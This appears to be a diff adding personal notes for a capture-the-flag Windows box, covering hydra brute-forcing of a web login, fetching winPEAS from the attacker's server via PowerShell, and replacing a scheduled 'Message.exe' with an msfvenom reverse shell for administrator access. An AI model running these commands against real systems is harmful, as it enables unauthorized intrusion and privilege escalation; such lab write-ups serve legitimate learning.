@@ -1,0 +1,63 @@
+--> using hydra to crack credentials -
+	'''
+	hydra -l username -P passwords.txt <target ip> -s <port> http-post-form "/<path>:<request>:<response_for_failure>"
+	'''
+copy the response from burp by intercepting the request and note the failure response and add it
+
+--> follow the steps written in "PostView.acsx" to compromise the machine.
+we have changes the name of the original file for the attack
+the original file was found by searching the exploit on google
+
+--> Priv Esc-
+send the winPEAS script to the target machine using powershell Invoke-WebRequest-
+(change directory to temp folder coz we have privileges for that folder)
+	'''
+	powershell Invoke-WebRequest -Uri http://<our_ip>:<our_port>//winpeas.exe -Outfile winpeas.exe
+	'''
+run this script-
+	winpeas.exe
+	. .\winpeas.exe
+	start winpeas.exe
+	start-process winpeas.exe
+the exploitable process running is - 'WindowsScheduler'
+
+--> one executable is running as a cronjob - 'Message.exe' under 'C:\Program Files (x86)\SystemScheduler'
+stop the process and replace the 'Message.exe' with our reverse shell and run the process and listen for incomming connections
+
+--> to check for running services-
+	'''
+	tasklist /v
+	'''
+--> to check for running processes- (run this in meterpreter, shell)
+	'''
+	ps
+	'''
+
+--> our malicious Message.exe- 
+	'''
+	msfvenom -p windows/shell_reverse_tcp LHOST=<our ip> LPORT=<port> -e x86/shikata_ga_nai -f exe > Message.exe
+	'''
+stop the service -
+	'''
+	sc stop WindowsScheduler
+	'''
+start python server and transfer it to target machine replacing original Message.exe
+listen for incomming connection using netcat
+and then start the service again-
+	'''
+	sc start WindowsScheduler
+	'''
+
+Administrator privileges done!
+
+
+
+--> ANOTHER WAY-
+default login credentials are present in winpeas results
+login using that in freeRDP service, 3389 port is open (default RDP port)
+	'''
+	xfreerdp /u:username /p:password /v:<target ip>
+	'''
+
+
+Administrator privileges done!
